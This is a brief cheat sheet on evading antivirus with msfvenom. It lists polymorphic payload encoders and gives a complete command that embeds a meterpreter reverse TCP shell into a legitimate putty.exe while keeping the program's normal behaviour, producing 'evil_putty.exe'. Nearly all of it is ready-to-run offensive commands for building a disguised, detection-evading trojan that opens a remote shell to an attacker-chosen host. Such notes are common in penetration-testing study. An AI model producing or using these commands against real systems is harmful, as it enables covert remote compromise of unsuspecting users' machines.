AV evasion is an arms race. No single technique is foolproof. Combine multiple layers: encoding + custom payload + process injection + HTTPS comms.
Payload Encoding
msfvenom ... -e x86/shikata_ga_nai -i 10 -b '\x00' — poly encoder
msfvenom ... -e x86/alpha_mixed
msfvenom ... -e x64/xor_dynamic
msfvenom -l encoders — list all encoders
Template Injection
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP LPORT=443 -x putty.exe -k -f exe -o evil_putty.exe
-x <template.exe> — inject into legit binary
-k — keep template behavior intact
